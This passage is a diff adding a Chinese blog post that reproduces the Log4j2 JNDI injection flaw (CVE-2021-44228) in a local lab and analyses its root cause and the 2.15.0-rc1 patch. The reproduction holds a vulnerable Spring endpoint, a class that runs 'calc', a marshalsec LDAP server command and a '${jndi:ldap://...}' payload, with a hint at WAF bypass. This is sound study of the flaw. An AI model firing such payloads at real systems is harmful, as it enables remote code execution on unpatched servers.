@@ -7875,4 +7875,277 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
         <tag>CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Log4j2（CVE-2021-44228）漏洞复现及原理思考</title>
+    <url>/posts/1e9a0fae.html</url>
+    <content><![CDATA[<h1 id="Log4j2（CVE-2021-44228）漏洞复现及原理思考"><a href="#Log4j2（CVE-2021-44228）漏洞复现及原理思考" class="headerlink" title="Log4j2（CVE-2021-44228）漏洞复现及原理思考"></a>Log4j2（CVE-2021-44228）漏洞复现及原理思考</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件。本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.15.0。</p>
+<p>因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似，导致有些人分不清自己用的是Log4j还是Log4j2。这里给出几个辨别方法：</p>
+<ol>
+<li>Log4j2分为2个jar包，一个是接口<code>log4j-api-${版本号}.jar</code>，一个是具体实现<code>log4j-core-${版本号}.jar</code>。Log4j只有一个jar包<code>log4j-${版本号}.jar</code>。</li>
+<li>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。</li>
+<li>Log4j2的package名称前缀为<code>org.apache.logging.log4j</code>。Log4j的package名称前缀为<code>org.apache.log4j</code>。</li>
+</ol>
+<p>Log4j2的JNDI注入漏洞（CVE-2021-44228）可以称之为“核弹”级别。Log4j2作为类似jdk级别的基础类库，几乎无人幸免。</p>
+<h2 id="一、漏洞复现"><a href="#一、漏洞复现" class="headerlink" title="一、漏洞复现"></a>一、漏洞复现</h2><h3 id="（一）服务端环境搭建"><a href="#（一）服务端环境搭建" class="headerlink" title="（一）服务端环境搭建"></a>（一）服务端环境搭建</h3><p>开发环境：IDEA 2021.2、JDK 8</p>
+<p>新建一个Spring项目，<code>File</code>→<code>New</code>→<code>Project</code>，配置如下</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908090322543.png" style="zoom: 80%;">
+
+<p>勾选Spring Web</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908090553268.png" style="zoom:80%;">
+
+<p>如果第一次创建，需稍等片刻下载spring-boot相关依赖，IDEA右下角可查看相关依赖下载进度。</p>
+<p>修改pom.xml文件</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091549004.png" style="zoom:80%;">
+
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091247246.png" style="zoom:80%;">
+
+<p>在<code>log4j_demo\src\main\java\com\example\log4j_demo</code>下创建<code>HelloLog4j.java</code>，内容如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>log4j_demo</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestBody</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@RestController</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloLog4j</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">private</span> <span class="token class-name">Logger</span>  <span class="token class-name">Logger</span> <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">HelloLog4j</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/login"</span> <span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>POST<span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Map</span> body<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">String</span> user <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> password <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Logger</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"user:{}, password:{}"</span> <span class="token punctuation">,</span> user <span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>IDEA右上角选择<code>Log4jDemoApplication</code>→<code>Edit Configurations</code>，弹窗修改<code>Environment</code>→<code>VM options</code></p>
+<pre class="line-numbers language-none"><code class="language-none">-Dcom.sun.jndi.ldap.object.trustURLCodebase=true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908092430183.png" style="zoom:80%;">
+
+<p>然后需要检查几个地方</p>
+<h4 id="1-JDK版本相关"><a href="#1-JDK版本相关" class="headerlink" title="1. JDK版本相关"></a><strong>1. JDK版本相关</strong></h4><p>可能出现的报错，参考：<a href="https://blog.csdn.net/weixin_44299027/article/details/120848738">【Java异常】IDEA 报错：无效的目标发行版：17 </a></p>
+<p><code>pom.xml</code>文件中的<code>java.version</code>属性需为8</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908093501751.png" style="zoom:80%;">
+
+<p><code>File</code>→<code>Project Structure</code>→<code>Project</code>，SDK版本如下</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908094641643.png" style="zoom:80%;">
+
+<p><code>File</code>→<code>Project Structure</code>→<code>Modules</code>，Language level如下</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908094857411.png" style="zoom:80%;">
+
+<p><code>Settings</code>→<code>Java Compiler</code>如下</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908100158994.png" style="zoom:80%;">
+
+<h4 id="2-SprinBoot版本相关"><a href="#2-SprinBoot版本相关" class="headerlink" title="2. SprinBoot版本相关"></a><strong>2. SprinBoot版本相关</strong></h4><p>可能出现的报错，参考：<a href="https://zhuanlan.zhihu.com/p/615816253">类文件具有错误的版本 61.0, 应为 52.0</a></p>
+<p><code>pom.xml</code>文件中spring-boot版本</p>
+<p>因为Spring官方发布从Spring 6以及SprinBoot 3.0开始最低支持JDK 17，此处用的JDK 8，所以需将SpringBoot版本降低为3.0以下，笔者此处用2.7.8。</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908100822489.png" alt="image-20230908100822489" style="zoom:80%;">
+
+<p>上面检查好后，右上角绿色小三角运行项目，控制台输出如下</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908131454392.png"></p>
+<p>浏览器访问：<a href="http://127.0.0.1:8080/login%EF%BC%8C%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%9B%A0%E4%B8%BA%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%8F%AA%E6%8E%A5%E6%94%B6POST%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%B8%8D%E5%BD%B1%E5%93%8D">http://127.0.0.1:8080/login，错误页面是因为代码中只接收POST请求，不影响</a></p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908102318581.png" style="zoom:80%;">
+
+<h3 id="（二）编写EXP"><a href="#（二）编写EXP" class="headerlink" title="（二）编写EXP"></a>（二）编写EXP</h3><p>新建一个Java项目，<code>File</code>→<code>New</code>→<code>Project</code></p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908102734860.png" style="zoom:80%;">
+
+<p>然后直接Next→Next→起个项目名<code>Exp</code>→Finish</p>
+<p>在src目录新建一个<code>Exp.java</code>，内容如下</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Exp</span> exploit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>右键运行，可看到计算器被打开，且项目目录<code>Exp\out\production\Exp</code>下生成了<code>Exp.class</code></p>
+<p>在此目录打开cmd，开一个http服务</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908104429604.png"></p>
+<p>然后利用反序列化工具<code>marshalsec</code>，开一个LDAP服务</p>
+<p>下载：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<p>参考：<a href="https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)">https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)</a></p>
+<p>下载marshalsec，进到主目录，用如下命令编译</p>
+<pre class="line-numbers language-none"><code class="language-none">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>编译成功cmd窗口末尾会显示如下内容</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908111918530.png"></p>
+<p>然后开启LDAP服务</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908112631128.png"></p>
+<p>通过HackBar用POST请求发送json格式payload如下，执行后，会弹出系统计算机</p>
+<pre class="line-numbers language-none"><code class="language-none">{
+	"user": "wa0er",
+	"password": "${jndi:ldap://127.0.0.1:1389/Exp}"
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113116419.png"></p>
+<p>此时看LDAP和HTTP服务窗口如下，<code>Exp.class</code>被调用执行</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113454423.png"></p>
+<p>复现成功！</p>
+<h2 id="二、原理分析"><a href="#二、原理分析" class="headerlink" title="二、原理分析"></a>二、原理分析</h2><h3 id="（一）JNDI注入"><a href="#（一）JNDI注入" class="headerlink" title="（一）JNDI注入"></a>（一）JNDI注入</h3><p>参考：<a href="https://xz.aliyun.com/t/12277#toc-2%E3%80%81https://tttang.com/archive/1611/#toc_jndi">https://xz.aliyun.com/t/12277#toc-2、https://tttang.com/archive/1611/#toc_jndi</a></p>
+<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。若程序定义了 JDNI 中的接口 API ，则就可以通过该接口 API 访问系统的 <code>命令服务</code>和<code>目录服务</code>，如下图。JNDI可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020153635388.png" style="zoom: 67%;">
+
+<p>JNDI 注入，即当开发者在定义 JNDI 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意payload，造成注入攻击。</p>
+<h3 id="（二）调试分析"><a href="#（二）调试分析" class="headerlink" title="（二）调试分析"></a>（二）调试分析</h3><p>由于是JNDI注入，因此可以在<code>InitialContext.lookup(String name)</code>方法下断点（也可以在创建的<code>HelloLog4j.java</code>的<code>Logger.error()</code>处下断点一步一步调试过来，但初次分析依然建议在<code>InitialContext</code>下断点，因为调用链较复杂，涉及循环、分支，且中间有一部分与此漏洞的产生关系不大）</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231012174606575.png" style="zoom: 80%;">
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231012102916281.png"></p>
+<p>有几个关键点</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Logger</span><span class="token punctuation">.</span>error
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token class-name">MessagePatternConverter</span><span class="token punctuation">.</span>format
+      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token class-name">StrSubstitutor</span><span class="token punctuation">.</span>resolveVariable
+          <span class="token class-name">Interpolator</span><span class="token punctuation">.</span>lookup
+            <span class="token class-name">JndiLookup</span><span class="token punctuation">.</span>lookup
+              <span class="token class-name">JndiManager</span><span class="token punctuation">.</span>lookup
+                <span class="token class-name">InitialContext</span><span class="token punctuation">.</span>lookup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="1-Logger-error"><a href="#1-Logger-error" class="headerlink" title="1. Logger.error()"></a>1. Logger.error()</h4><p>从<code>Logger.error()</code>处进来</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019172132503.png" style="zoom: 80%;">
+
+<p>在进行<code>Logger.error()</code>日志记录时会采用<code>logIfEnabled()</code>方法进行判断，<code>isEnabled()</code>返回为<code>true</code>才可以继续进行日志操作。这里也是漏洞能否成功触发的关键。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019172601198.png"></p>
+<p>在本次漏洞分析过程中日志等级level为ERROR，它的<code>intLevel()</code>为200，而本环境中默认的日志级别<code>this.intLevel</code>为200（ERROR），正好满足<code>this.intLevel &gt;= level.intLevel()</code>。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019173139650.png"></p>
+<p>此时<code>filter()</code>方法返回true，即<code>isEnabled()</code>返回为<code>true</code>，成功进入到<code>logMessage()</code>方法中。log4j默认的日志级别定义如下图，从上到下级别逐渐降低，<code>intLevel()</code>数值逐渐增大，分别是：OFF(0)、FATAL(100)、ERROR(200)、WARN(300)、INFO(400)、DEBUG(500)、TRACE(600)、ALL(2147483647)。<strong>由此可见，漏洞能否成功触发与设置的日志Level有关，需要不低于默认日志级别。</strong></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019174105468.png"></p>
+<p>然后中间就是读取配置文件创建event事件等操作，一直到<code>MessagePatternConverter.format()</code>。</p>
+<h4 id="2-MessagePatternConverter-format"><a href="#2-MessagePatternConverter-format" class="headerlink" title="2. MessagePatternConverter.format()"></a>2. MessagePatternConverter.format()</h4><p>该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含<code>${</code>子串时，调用StrSubstitutor进行进一步解析。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019200851377.png"></p>
+<h4 id="3-StrSubstitutor-resolveVariable"><a href="#3-StrSubstitutor-resolveVariable" class="headerlink" title="3. StrSubstitutor.resolveVariable()"></a>3. StrSubstitutor.resolveVariable()</h4><p>StrSubstitutor将<code>${</code>和<code>}</code>之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019202544583.png"></p>
+<p>其中，StrSubstitutor.substitute()会经过如下for循环，匹配<code>:-</code>子串，这里就为后面的waf绕过提供了思路。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019201754382.png"></p>
+<h4 id="4-Interpolator-lookup"><a href="#4-Interpolator-lookup" class="headerlink" title="4. Interpolator.lookup()"></a>4. Interpolator.lookup()</h4><p>Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量<code>strLookupMap</code>中（**本环境是<code>lookups</code>**）保存着各类Lookup功能的真正实现类。Interpolator对上一步提取出的内容解析后，从<code>strLookupMap</code>获得Lookup功能实现类，并调用实现类的<code>lookup()</code>方法。</p>
+<p>例如对本例子中的<code>jndi:ldap://127.0.0.1:1389/Exp</code>解析后得到<code>jndi</code>的Lookup功能实现类为<code>JndiLookup</code>，并调用<code>JndiLookup.lookup()</code>方法。</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203156913.png" style="zoom:80%;">
+
+<h4 id="5-JndiLookup-lookup"><a href="#5-JndiLookup-lookup" class="headerlink" title="5. JndiLookup.lookup()"></a>5. JndiLookup.lookup()</h4><p><code>JndiLookup.lookup()</code>方法调用<code>JndiManager.lookup()</code>方法处理jndi对象。</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203709387.png" style="zoom: 80%;">
+
+<h4 id="6-JndiManager-lookup"><a href="#6-JndiManager-lookup" class="headerlink" title="6. JndiManager.lookup()"></a>6. JndiManager.lookup()</h4><p><code>JndiManager.lookup()</code>直接委托给<code>InitialContext.lookup()</code>方法。这里单独提到该方法，是因为后续的补丁中较为重要的变更即为该方法。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203751594.png"></p>
+<p>至此，后续即可按照常规jndi注入路径进行分析。</p>
+<h2 id="三、补丁分析"><a href="#三、补丁分析" class="headerlink" title="三、补丁分析"></a>三、补丁分析</h2><h3 id="（一）2-15-0-rc1"><a href="#（一）2-15-0-rc1" class="headerlink" title="（一）2.15.0-rc1"></a>（一）2.15.0-rc1</h3><p>通过比较2.15.0-rc1和该版本之前最后一个版本2.14.1之间的差异，可以发现Log4j2团队在12月5日提交了一个名为<code>Restrict LDAP access via JNDI (#608)</code>的commit。该commit的详细内容如下链接：</p>
+<p><a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3">https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3</a></p>
+<p>除去一些测试代码和辅助代码，该commit最主要内容是在 <code>JndiManager.lookup()</code>方法增加了几种限制，分别是<code>allowedHosts</code>、<code>allowedClasses</code>、<code>allowedProtocols</code>。</p>
+<p>由于rc1未在maven中央仓库上，因此需要自行下载代码并构建：</p>
+<p>到Log4j2的GitHub官方仓库下载rc1：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82%E5%88%86%E5%88%AB%E8%BF%9B%E5%85%A5log4j-api%E5%92%8Clog4j-core%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%89%A7%E8%A1%8C%60mvn">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。分别进入log4j-api和log4j-core目录，执行`mvn</a> clean install -DskipTests`。最终会在本地maven仓库上生成rc1的jar包，版本为2.15.0，后续测试使用该jar包。</p>
+<p><strong>说明：</strong>此处笔者尝试构建时，maven的国内镜像（阿里云、腾讯云、华为云、网易云）均无法解析2.15.0的jar包</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020174739501.png"></p>
+<p>以下图片参考：<a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020173958585.png"></p>
+<p>各个限制的内容分别如下：</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180027074.png"></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180053823.png"></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180108755.png"></p>
+<p>可以看到，rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为<code>java</code>、<code>ldap</code>、<code>ldaps</code>，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。</p>
+<h3 id="（二）2-15-0-rc2"><a href="#（二）2-15-0-rc2" class="headerlink" title="（二）2.15.0-rc2"></a>（二）2.15.0-rc2</h3><h4 id="1-rc1中存在的问题"><a href="#1-rc1中存在的问题" class="headerlink" title="1. rc1中存在的问题"></a>1. rc1中存在的问题</h4><p>rc1里主要修复的<code>JndiManager.lookup()</code>方法的整体逻辑结构如下：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token class-name">URI</span> uri <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URI</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedProtocols<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>ROOT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>LDAP<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> LDAPS<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedHosts<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+                    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedClasses<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+                                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">}</span>
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">URISyntaxException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">// This is OK.</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从上面的代码结构中可以总结如下的逻辑：</p>
+<ul>
+<li>对传入的<code>name</code>参数进行前面提到的三类白名单检查。如果检查不通过，则直接返回<code>null</code>。</li>
+<li>如果产生<code>URISyntaxException</code>，则对该异常忽略，继续执行<code>this.context.lookup(name)</code>。</li>
